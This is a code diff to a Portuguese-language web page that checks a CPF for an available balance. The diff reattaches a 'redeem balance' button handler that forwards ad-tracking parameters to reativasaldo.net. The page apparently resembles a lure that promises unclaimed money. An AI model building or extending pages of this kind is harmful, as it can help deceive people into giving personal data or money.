@@ -255,6 +255,23 @@
                             <button type="button" id="resgateBtn" class="resgate-btn">Resgatar esse saldo agora</button>
                         `;
                         resultDiv.className = 'success';
+
+                        // Adiciona o evento ao botão após sua criação
+                        const resgateBtn = document.getElementById('resgateBtn');
+                        resgateBtn.addEventListener('click', function () {
+                            const urlParams = new URLSearchParams(window.location.search);
+                            const utms = {};
+                            ['utm_source', 'utm_campaign', 'utm_medium', 'utm_content', 'utm_term'].forEach(param => {
+                                if (urlParams.has(param)) {
+                                    utms[param] = urlParams.get(param);
+                                }
+                            });
+                            const baseUrl = 'https://reativasaldo.net/prevpivsl';
+                            const utmString = new URLSearchParams(utms).toString();
+                            const destinoUrl = utmString ? `${baseUrl}?${utmString}` : baseUrl;
+                            window.location.href = destinoUrl;
+                            console.log('Redirecionando para:', destinoUrl);
+                        });
                     } else {
                         resultDiv.innerHTML = 'CPF não encontrado ou sem saldo disponível. Tente novamente.';
                         resultDiv.className = 'error';
@@ -265,32 +282,6 @@
                     resultDiv.innerHTML = `Erro na consulta: ${error.message}`;
                     resultDiv.className = 'error';
                 });
-        });
-
-        // Adicionando lógica para preservar UTMs no redirecionamento
-        document.addEventListener('DOMContentLoaded', function () {
-            const resgateBtn = document.getElementById('resgateBtn');
-            if (resgateBtn) {
-                resgateBtn.addEventListener('click', function () {
-                    // Captura os parâmetros UTM da URL atual
-                    const urlParams = new URLSearchParams(window.location.search);
-                    const utms = {};
-                    ['utm_source', 'utm_campaign', 'utm_medium', 'utm_content', 'utm_term'].forEach(param => {
-                        if (urlParams.has(param)) {
-                            utms[param] = urlParams.get(param);
-                        }
-                    });
-
-                    // Constrói a URL de destino com os UTMs
-                    const baseUrl = 'https://reativasaldo.net/prevpivsl';
-                    const utmString = new URLSearchParams(utms).toString();
-                    const destinoUrl = utmString ? `${baseUrl}?${utmString}` : baseUrl;
-
-                    // Redireciona
-                    window.location.href = destinoUrl;
-                    console.log('Redirecionando para:', destinoUrl); // Log para depuração
-                });
-            }
         });
     </script>
     <script>
